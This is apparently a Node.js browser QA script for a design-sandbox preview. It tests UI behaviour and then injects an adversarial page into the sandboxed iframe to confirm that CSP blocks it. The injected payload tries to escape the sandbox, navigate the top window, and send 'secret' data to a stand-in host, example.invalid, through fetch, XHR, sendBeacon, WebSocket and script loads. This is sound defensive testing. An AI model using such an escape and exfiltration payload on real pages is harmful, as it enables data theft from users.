// Dependency-free browser QA for the RPShop design sandbox and built-in sample.
// First emit the actual Rust preview wrapper:
// RPSHOP_DESIGN_QA_OUTPUT=target/ai-browser-qa cargo test --lib design::
// Then: node scripts/ai-browser-qa.mjs [wrapper.html] [installed-browser.exe]
// No npm packages, server, downloaded browser, or reference-project code required.
import {spawn} from 'node:child_process';
import {readFile,writeFile,mkdir,mkdtemp,stat} from 'node:fs/promises';
import path from 'node:path';
import {pathToFileURL} from 'node:url';
import assert from 'node:assert/strict';

const root=path.resolve(import.meta.dirname,'..');
let input=path.resolve(process.argv[2]||path.join(root,'target/ai-browser-qa/sample.html'));
if((await stat(input)).isDirectory())input=path.join(input,'sample.html');
const browserPath=process.argv[3]||'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe';
const output=await mkdtemp(path.join(await mkdir(path.join(root,'target/ai-browser-qa'),{recursive:true}).then(()=>path.join(root,'target/ai-browser-qa')),'run-'));
const browser=spawn(browserPath,['--headless=new','--disable-gpu','--no-first-run','--no-default-browser-check','--remote-debugging-port=0','--user-data-dir='+path.join(output,'profile'),'about:blank'],{windowsHide:true,stdio:['ignore','ignore','pipe']});
let client;const checks=[];const errors=[];const contexts=new Map();const requests=[];const sockets=[];const failedRequests=new Map();const sentRequests=new Set();
function check(name,value){checks.push({name,passed:!!value});assert.ok(value,name)}
class Protocol {
  constructor(socket){this.socket=socket;this.next=0;this.pending=new Map();this.events=new Map();socket.addEventListener('message',event=>{const message=JSON.parse(event.data);if(message.id){const pending=this.pending.get(message.id);if(!pending)return;this.pending.delete(message.id);clearTimeout(pending.timer);message.error?pending.reject(new Error(JSON.stringify(message.error))):pending.resolve(message.result)}else{for(const fn of this.events.get(message.method)||[])fn(message.params,message.sessionId)}})}
  on(method,fn){const listeners=this.events.get(method)||[];listeners.push(fn);this.events.set(method,listeners)}
  send(method,params={},sessionId){return new Promise((resolve,reject)=>{const id=++this.next;const timer=setTimeout(()=>{this.pending.delete(id);reject(new Error('Protocol timeout: '+method))},15000);this.pending.set(id,{resolve,reject,timer});this.socket.send(JSON.stringify({id,method,params,...(sessionId?{sessionId}:{} )}))})}
  close(){this.socket.close();for(const pending of this.pending.values()){clearTimeout(pending.timer);pending.reject(new Error('Browser closed'))}this.pending.clear()}
}
const wait=ms=>new Promise(resolve=>setTimeout(resolve,ms));
try{
  const endpoint=await new Promise((resolve,reject)=>{let log='';const timer=setTimeout(()=>reject(new Error('Browser startup timeout: '+log)),20000);browser.stderr.on('data',data=>{log+=data;const match=log.match(/DevTools listening on (ws:\/\/[^\s]+)/);if(match){clearTimeout(timer);resolve(match[1])}});browser.once('error',reject);browser.once('exit',code=>{clearTimeout(timer);reject(new Error('Browser exited '+code+': '+log))})});
  const socket=new WebSocket(endpoint);await new Promise((resolve,reject)=>{socket.addEventListener('open',resolve,{once:true});socket.addEventListener('error',reject,{once:true})});client=new Protocol(socket);
  const {targetId}=await client.send('Target.createTarget',{url:'about:blank'});const {sessionId}=await client.send('Target.attachToTarget',{targetId,flatten:true});
  client.on('Target.attachedToTarget',async event=>{if(event.targetInfo.type==='iframe'){for(const method of ['Page.enable','Runtime.enable','Network.enable'])await client.send(method,{},event.sessionId);await client.send('Target.setAutoAttach',{autoAttach:true,waitForDebuggerOnStart:true,flatten:true},event.sessionId);await client.send('Runtime.runIfWaitingForDebugger',{},event.sessionId)}});
  client.on('Runtime.executionContextCreated',(event,session)=>contexts.set(session+':'+event.context.id,{...event.context,session}));
  client.on('Runtime.executionContextDestroyed',(event,session)=>contexts.delete(session+':'+event.executionContextId));
  await client.send('Target.setAutoAttach',{autoAttach:true,waitForDebuggerOnStart:false,flatten:true},sessionId);
  client.on('Runtime.exceptionThrown',event=>errors.push(event.exceptionDetails.exception?.description||event.exceptionDetails.text));
  client.on('Network.requestWillBeSent',event=>requests.push({id:event.requestId,url:event.request.url}));
  client.on('Network.requestWillBeSentExtraInfo',event=>sentRequests.add(event.requestId));
  client.on('Network.loadingFailed',event=>failedRequests.set(event.requestId,event.blockedReason||event.errorText));
  client.on('Network.webSocketCreated',event=>sockets.push(event.url));
  for(const method of ['Page.enable','Runtime.enable','Network.enable'])await client.send(method,{},sessionId);
  const evaluate=async(expression,context)=>{const result=await client.send('Runtime.evaluate',{expression,contextId:context?.id,awaitPromise:true,returnByValue:true,userGesture:true},context?.session||sessionId);if(result.exceptionDetails)throw new Error(result.exceptionDetails.exception?.description||result.exceptionDetails.text);return result.result.value};
  const childContext=async()=>{for(let i=0;i<60;i++){const candidates=[...contexts.values()].filter(context=>context.auxData?.isDefault);for(const context of candidates){try{if(await evaluate("location.href==='about:srcdoc'",context))return context}catch{}}await wait(100)}await writeFile(path.join(output,'frame-debug.json'),JSON.stringify({contexts:[...contexts.values()],tree:await client.send('Page.getFrameTree',{},sessionId),dom:await evaluate('document.documentElement.outerHTML'),errors},null,2));const shot=await client.send('Page.captureScreenshot',{format:'png'},sessionId);await writeFile(path.join(output,'frame-debug.png'),Buffer.from(shot.data,'base64'));throw new Error('No sandbox iframe execution context: '+JSON.stringify([...contexts.values()]))};
  const screenshot=async name=>{await wait(800);const {data}=await client.send('Page.captureScreenshot',{format:'png',captureBeyondViewport:false},sessionId);await writeFile(path.join(output,name+'.png'),Buffer.from(data,'base64'))};
  await client.send('Emulation.setDeviceMetricsOverride',{width:1440,height:1100,deviceScaleFactor:1,mobile:false},sessionId);
  await client.send('Page.navigate',{url:pathToFileURL(input).href},sessionId);let context=await childContext();
  const pointerClick=async selector=>{const point=await evaluate(`(()=>{const element=document.querySelector(${JSON.stringify(selector)});element.scrollIntoView({block:'center'});const r=element.getBoundingClientRect();return {x:r.left+r.width/2,y:r.top+r.height/2}})()`,context);const offset=await evaluate("(()=>{const r=document.querySelector('#design').getBoundingClientRect();return {x:r.left+1,y:r.top+1}})()");const x=point.x+offset.x,y=point.y+offset.y;for(const type of ['mousePressed','mouseReleased'])await client.send('Input.dispatchMouseEvent',{type,x,y,button:'left',clickCount:1},sessionId)};
  for(let i=0;i<50;i++){if(await evaluate("!!document.querySelector('#feature-detail')",context))break;await wait(100)}
  check('sample has no horizontal overflow at desktop',await evaluate('document.documentElement.scrollWidth<=innerWidth',context));
  check('sample scripts execute in opaque origin without parent access',await evaluate("(()=>{try{parent.document;return false}catch{return location.origin==='null'}})()",context));
  await screenshot('desktop');
  await pointerClick('#feature-detail');check('real pointer input opens route modal',await evaluate("document.querySelector('#detail-dialog').open",context));await screenshot('desktop-route-modal');await client.send('Input.dispatchKeyEvent',{type:'keyDown',key:'Escape',code:'Escape',windowsVirtualKeyCode:27},sessionId);await client.send('Input.dispatchKeyEvent',{type:'keyUp',key:'Escape',code:'Escape',windowsVirtualKeyCode:27},sessionId);check('real Escape keyboard input dismisses modal',await evaluate("!document.querySelector('#detail-dialog').open",context));
  const interactionChecks=await evaluate(`(()=>{const checks=[];const check=(name,value)=>{checks.push({name,passed:!!value});if(!value)throw new Error(name)};const $=selector=>document.querySelector(selector);const visible=()=>[...document.querySelectorAll('.route-card')].filter(card=>!card.hidden).length;
    $('[data-filter="coast"]').click();check('category filter changes actual routes',visible()===1&&!$('[data-id="aranya"]').hidden);
    $('[data-filter="all"]').click();$('#route-search').value='不存在的地方';$('#route-search').dispatchEvent(new Event('input'));check('search shows accessible empty state',visible()===0&&!$('#routes-empty').hidden);$('#reset-filters').click();check('reset restores all routes',visible()===3);
    $('[data-save="songyang"]').click();$('#saved-only').click();check('favorites filter works',visible()===1&&$('[data-save="songyang"]').getAttribute('aria-pressed')==='true');$('#saved-only').click();
    $('#feature-detail').click();check('route detail opens native modal with real itinerary',$('#detail-dialog').open&&$('#detail-days').children.length===3);$('#detail-plan').click();check('detail flows into prefilled creation form',!$('#detail-dialog').open&&$('#plan-dialog').open&&$('#trip-destination').value==='songyang');
    $('#trip-name').value='<script>literal travel</script>';$('#trip-note').value='A real editable local plan';$('[data-submit="plan-form"]').click();check('form creates trip and navigates to trips',!$('#plan-dialog').open&&!$('#view-trips').hidden&&$('#trip-list').children.length===2);check('user text stays text, never becomes markup',$('#trip-list h2').textContent==='<script>literal travel</script>'&&!$('#trip-list script'));
    $('#trip-list .text-button').click();check('trip state toggle changes content',$('#trip-list .trip-item-footer span').textContent==='已放进旅行回忆');
    $('[data-nav="journal"]').click();check('journal navigation shows different working view',!$('#view-journal').hidden&&$('#view-trips').hidden);$('#journal-entry').value='山风是今天最好的来信。';$('#journal-entry').dispatchEvent(new Event('input'));$('[data-submit="journal-form"]').click();check('journal form appends editable note',$('#journal-notes .personal-note').textContent==='山风是今天最好的来信。'&&$('#journal-entry').value==='');
    const before=document.documentElement.dataset.theme;$('#theme-toggle').click();check('theme toggle switches tokens and accessible state',before!==document.documentElement.dataset.theme&&$('#theme-toggle').getAttribute('aria-pressed')===String(document.documentElement.dataset.theme==='dark'));
    $('[data-nav="discover"]').click();return checks})()`,context);checks.push(...interactionChecks);
  await screenshot('desktop-dark');
  await client.send('Emulation.setDeviceMetricsOverride',{width:430,height:1000,deviceScaleFactor:1,mobile:false},sessionId);
  await client.send('Emulation.setEmulatedMedia',{features:[{name:'prefers-reduced-motion',value:'reduce'}]},sessionId);
  if(context.session!==sessionId)await client.send('Emulation.setEmulatedMedia',{features:[{name:'prefers-reduced-motion',value:'reduce'}]},context.session);
  await evaluate("document.querySelector('button[data-size=\"mobile\"]').click()");
  await evaluate("document.documentElement.dataset.theme='light';window.scrollTo(0,0)",context);
  check('mobile has no horizontal overflow',await evaluate('document.documentElement.scrollWidth<=innerWidth',context));
  check('reduced motion disables entrance and hover animations',await evaluate("matchMedia('(prefers-reduced-motion: reduce)').matches&&getComputedStyle(document.querySelector('.entrance')).animationName==='none'&&getComputedStyle(document.querySelector('.route-card')).transitionDuration==='0s'",context));
  await screenshot('mobile-reduced-motion');
  await evaluate("document.querySelector('#routes-title').scrollIntoView({block:'start',behavior:'instant'})",context);await screenshot('mobile-routes');await evaluate('window.scrollTo(0,0)',context);
  await pointerClick('#plan-top');check('mobile form remains inside viewport',await evaluate("(()=>{const r=document.querySelector('#plan-dialog').getBoundingClientRect();return r.left>=0&&r.right<=innerWidth&&r.top>=0&&r.bottom<=innerHeight})()",context));await screenshot('mobile-form');
  await client.send('Input.insertText',{text:'键盘写下的周末'},sessionId);await client.send('Input.dispatchKeyEvent',{type:'keyDown',key:'Enter',code:'Enter',windowsVirtualKeyCode:13},sessionId);await client.send('Input.dispatchKeyEvent',{type:'keyUp',key:'Enter',code:'Enter',windowsVirtualKeyCode:13},sessionId);check('real typing and Enter create a mobile itinerary in script-only sandbox',await evaluate("!document.querySelector('#plan-dialog').open&&document.querySelector('#trip-list h2').textContent==='键盘写下的周末'",context));await screenshot('mobile-trip-created');
  const raw=await readFile(input,'utf8');const match=raw.match(/srcdoc="([\s\S]*?)"><\/iframe>/);assert.ok(match,'Rust wrapper srcdoc');
  const decode=value=>value.replaceAll('&quot;','"').replaceAll('&#39;',"'").replaceAll('&lt;','<').replaceAll('&gt;','>').replaceAll('&amp;','&');
  const encode=value=>value.replaceAll('&','&amp;').replaceAll('"','&quot;').replaceAll("'",'&#39;').replaceAll('<','&lt;').replaceAll('>','&gt;');
  const originalChild=decode(match[1]);const generatedStart=originalChild.indexOf('<!doctype html>',15);assert.ok(generatedStart>0);
  const attack=`<!doctype html><html><head><style>body{background-image:url(https://example.invalid/css)}</style><link rel="dns-prefetch" href="https://example.invalid"></head><body><img src="https://example.invalid/image"><script>window.test={};try{parent.document.body.innerHTML='ESCAPED';test.parent=true}catch{test.parent=false}try{top.location='https://example.invalid/top';test.top=true}catch{test.top=false}test.popup=!!window.open('https://example.invalid/popup');test.rtc=typeof RTCPeerConnection;fetch('https://example.invalid/fetch').then(()=>test.fetch=true).catch(()=>test.fetch=false);try{const xhr=new XMLHttpRequest();xhr.open('POST','https://example.invalid/xhr');xhr.send('secret')}catch{}try{navigator.sendBeacon('https://example.invalid/beacon','secret')}catch{}const ws=new WebSocket('wss://example.invalid/socket');ws.onerror=()=>test.websocket=false;const s=document.createElement('script');s.src='https://example.invalid/script';document.body.append(s);const nested=document.createElement('iframe');document.body.append(nested);try{test.nestedRTC=typeof nested.contentWindow.RTCPeerConnection}catch{test.nestedRTC='blocked'}</script></body></html>`;
  const attackFile=path.join(output,'sandbox-adversarial.html');await writeFile(attackFile,raw.replace(match[1],()=>encode(originalChild.slice(0,generatedStart)+attack)));
  const requestStart=requests.length;await client.send('Page.navigate',{url:pathToFileURL(attackFile).href},sessionId);context=await childContext();await wait(700);
  const security=await evaluate('window.test',context);check('sandbox blocks parent DOM, top navigation and popups',security?.parent===false&&security?.top===false&&security?.popup===false);check('sandbox blocks fetch and removes WebRTC constructors',security?.fetch===false&&security?.rtc==='undefined');
  const remoteRequests=requests.slice(requestStart).filter(request=>/^(https?|wss?):/.test(request.url)).map(request=>({...request,blockedReason:failedRequests.get(request.id),sent:sentRequests.has(request.id)}));
  check('every attempted network resource is blocked by browser CSP',remoteRequests.every(request=>request.blockedReason==='csp'&&!request.sent));
  check('WebSocket creation never reaches network',sockets.length===0);
  check('nested empty iframe cannot recover a network-enabled realm',security?.nestedRTC==='blocked'||security?.nestedRTC==='undefined');
  // Network.requestWillBeSent also reports CSP-blocked requests; inspect browser
  // loadingFailed blockedReason instead of treating attempted requests as sent.
  await evaluate("location.href='https://example.invalid/frame'",context).catch(()=>{});await wait(300);
  const tree=await client.send('Page.getFrameTree',{},sessionId);check('parent CSP blocks iframe remote navigation',tree.frameTree.frame.url===pathToFileURL(attackFile).href&&tree.frameTree.childFrames?.[0]?.frame.url!=='https://example.invalid/frame');
  check('sample has no uncaught script errors',errors.filter(error=>!error.includes('SecurityError')).length===0);
  const result={date:new Date().toISOString(),browser:(await client.send('Browser.getVersion')).product,input,output,checks,passed:checks.every(check=>check.passed),scriptErrors:errors,security,remoteAttemptsReportedByBrowser:remoteRequests,websocketAttempts:sockets};
  await writeFile(path.join(output,'results.json'),JSON.stringify(result,null,2)+'\n');console.log(JSON.stringify(result,null,2));
}catch(error){console.error(error);await writeFile(path.join(output,'failure.json'),JSON.stringify({checks,errors,error:String(error),output},null,2));process.exitCode=1}finally{try{await client?.send('Browser.close')}catch{}client?.close();browser.kill();console.log('QA output: '+output)}
